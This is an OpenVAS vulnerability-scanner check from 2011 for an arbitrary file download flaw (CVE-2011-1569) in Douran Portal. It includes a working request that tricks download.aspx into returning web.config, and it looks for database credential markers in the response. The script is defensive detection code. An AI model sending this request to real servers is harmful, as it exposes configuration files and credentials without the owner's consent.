###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_douran_46927.nasl 5993 2017-04-20 15:45:39Z cfi $
#
# Douran Portal 'download.aspx' Arbitrary File Download Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103120");
  script_version("$Revision: 5993 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-20 17:45:39 +0200 (Thu, 20 Apr 2017) $");
  script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2011-1569");
  script_bugtraq_id(46927);
  script_name("Douran Portal 'download.aspx' Arbitrary File Download Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46927");
  script_xref(name:"URL", value:"http://www.douran.com/HomePage.aspx?TabID=3901&Site=DouranPortal&Lang=en-US");

  tag_summary = "Douran Portal is prone to a vulnerability that lets attackers download
  arbitrary files. This issue occurs because the application fails to
  sufficiently sanitize user-supplied input.";

  tag_impact = "Exploiting this issue will allow an attacker to view arbitrary files
  within the context of the application. Information harvested may aid
  in launching further attacks.";

  tag_affected = "Douran Portal 3.9.7.8 is affected; other versions may also be
  vulnerable.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_asp( port:port ) ) exit( 0 );

url = string('/download.aspx?FilePathAttach=/&FileNameAttach=web.config\\.&OriginalAttachFileName=secretfile.txt');

if( http_vuln_check( port:port, url:url, pattern:"<configSections>", extra_check:make_list("uid=","pwd=","DouranLogLocation","EnableErrorLog","DouranPortalConfigUpdated" ) ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
